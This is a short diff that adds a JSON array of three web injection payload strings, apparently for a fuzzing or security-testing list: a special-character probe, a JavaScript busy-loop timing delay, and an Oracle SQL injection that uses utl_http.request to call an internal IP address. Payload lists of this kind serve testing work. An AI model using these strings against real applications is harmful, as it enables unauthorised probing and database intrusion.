@@ -1,0 +1,5 @@
+[
+    "<>\"'%;)(&+",
+    "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000)",
+    "'||utl_http.request('httP://192.168.1.1/')||'"
+]
